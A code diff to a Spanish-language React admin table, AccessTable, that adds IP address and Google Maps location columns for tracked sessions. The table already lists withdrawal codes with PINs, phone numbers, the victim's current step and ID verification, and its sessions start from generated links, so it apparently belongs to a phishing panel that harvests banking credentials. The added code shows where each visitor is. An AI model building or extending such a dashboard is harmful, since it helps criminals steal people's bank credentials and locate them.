@@ -9,7 +9,7 @@ import { useDeviceInfo } from '@/hooks/use-device-orientation';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
-import { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode, Search } from 'lucide-react';
+import { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode, Search, MapPin, Globe, ExternalLink } from 'lucide-react';
 import { DeleteConfirmDialog } from './DeleteConfirmDialog';
 
 interface AccessTableProps {
@@ -643,6 +643,33 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     )}
                     
+                    {/* Información de ubicación */}
+                    {session.ipAddress && (
+                      <div className="mb-2 flex gap-1 items-center">
+                        <Globe className="h-4 w-4 text-[#888]" />
+                        <div className="text-sm text-[#ccc]">
+                          IP: {session.ipAddress}
+                        </div>
+                      </div>
+                    )}
+                    
+                    {session.googleMapsLink && (
+                      <div className="mb-2 flex gap-1 items-center">
+                        <MapPin className="h-4 w-4 text-[#888]" />
+                        <a
+                          href={session.googleMapsLink}
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          className="text-[#00aaff] hover:text-[#0088dd] flex items-center gap-1 text-sm"
+                          onClick={(e) => e.stopPropagation()}
+                          data-testid="link-google-maps-mobile"
+                        >
+                          Ver en Google Maps
+                          <ExternalLink className="h-3 w-3" />
+                        </a>
+                      </div>
+                    )}
+                    
                     {/* Información del creador (solo visible para administradores) */}
                     <div className="mb-3 flex gap-1 items-center">
                       <Target className="h-4 w-4 text-[#888]" />
@@ -716,6 +743,8 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-2 text-left w-[130px]">Código Retiro + PIN</th>
                 <th className="p-2 text-left w-[80px]">QR</th>
                 <th className="p-2 text-left w-[70px]">Celular</th>
+                <th className="p-2 text-left w-[100px]">IP Address</th>
+                <th className="p-2 text-left w-[100px]">Google Maps</th>
                 <th className="p-2 text-left w-[90px]">Paso actual</th>
                 <th className="p-2 text-left w-[90px]">Creado por</th>
                 <th className="p-2 text-left w-[100px]">Verificación ID</th>
@@ -725,7 +754,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={16} className="p-4 text-center text-gray-400">
+                  <td colSpan={18} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
@@ -818,6 +847,30 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   </td>
                   <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.celular || '--'}
+                  </td>
+                  <td className="p-2 text-[#ccc] truncate">
+                    {session.ipAddress ? (
+                      <div className="flex items-center gap-1">
+                        <Globe className="h-3 w-3 text-[#888]" />
+                        <span className="text-xs">{session.ipAddress}</span>
+                      </div>
+                    ) : '--'}
+                  </td>
+                  <td className="p-2 text-[#ccc]">
+                    {session.googleMapsLink ? (
+                      <a
+                        href={session.googleMapsLink}
+                        target="_blank"
+                        rel="noopener noreferrer"
+                        className="text-[#00aaff] hover:text-[#0088dd] flex items-center gap-1 text-xs"
+                        onClick={(e) => e.stopPropagation()}
+                        data-testid="link-google-maps"
+                      >
+                        <MapPin className="h-3 w-3" />
+                        Maps
+                        <ExternalLink className="h-2 w-2" />
+                      </a>
+                    ) : '--'}
                   </td>
                   <td className={`p-2 truncate ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.pasoActual ? 
